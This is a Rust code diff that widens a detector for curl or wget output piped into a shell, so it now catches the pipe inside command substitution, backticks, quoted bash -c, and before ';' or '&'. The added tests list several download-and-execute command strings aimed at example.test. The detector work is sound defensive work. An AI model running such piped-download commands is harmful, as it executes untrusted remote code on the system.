@@ -276,12 +276,14 @@ pub fn is_download_piped_to_shell(line: &str) -> bool {
     if !line.contains("curl") && !line.contains("wget") {
         return false;
     }
+    // The shell name may end the command substitution or quoted command it
+    // runs in: `$(curl ... | sh)`, `bash -c "curl ... | sh"`.
     line.split('|').skip(1).any(|command| {
         let command = command.trim_start();
         ["sh", "bash", "zsh"].iter().any(|shell| {
-            command
-                .strip_prefix(shell)
-                .is_some_and(|rest| rest.is_empty() || rest.starts_with([' ', '\t']))
+            command.strip_prefix(shell).is_some_and(|rest| {
+                rest.is_empty() || rest.starts_with([' ', '\t', ')', '`', ';', '&', '"', '\''])
+            })
         })
     })
 }
@@ -752,6 +754,18 @@ mod tests {
         ));
         assert!(!is_download_piped_to_shell(
             "curl https://example.test/data | shasum"
+        ));
+        for substituted in [
+            "echo \"$(curl https://example.test/p | sh)\"",
+            "x=`wget -qo- https://example.test/p | bash`",
+            "bash -c \"curl https://example.test/p | sh\"",
+            "curl https://example.test/p | sh; echo done",
+            "curl https://example.test/p | sh&",
+        ] {
+            assert!(is_download_piped_to_shell(substituted), "{substituted}");
+        }
+        assert!(!is_download_piped_to_shell(
+            "curl https://example.test/data | shellcheck -"
         ));
     }
 
